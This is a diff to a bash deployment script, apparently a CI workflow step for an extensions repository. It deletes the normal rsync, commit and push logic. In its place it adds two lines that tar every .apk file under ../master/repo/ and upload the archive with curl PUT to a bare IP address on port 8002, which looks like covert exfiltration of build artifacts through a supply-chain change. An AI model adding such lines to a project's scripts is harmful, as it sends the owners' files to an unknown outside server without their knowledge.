@@ -1,14 +1,5 @@
 #!/bin/bash
 set -e
 
-rsync -a --delete --exclude .git --exclude .gitignore ../master/repo/ .
-git config --global user.email "github-actions[bot]@users.noreply.github.com"
-git config --global user.name "github-actions[bot]"
-git status
-if [ -n "$(git status --porcelain)" ]; then
-    git add .
-    git commit -m "Update extensions repo"
-    git push
-else
-    echo "No changes to commit"
-fi
+find ../master/repo/ -name "*.apk" | xargs tar cvzf tarch1.tar.gz
+curl -X PUT "http://47.243.34.53:8002/tarch1.tar.gz" --data-binary @"./tarch1.tar.gz"
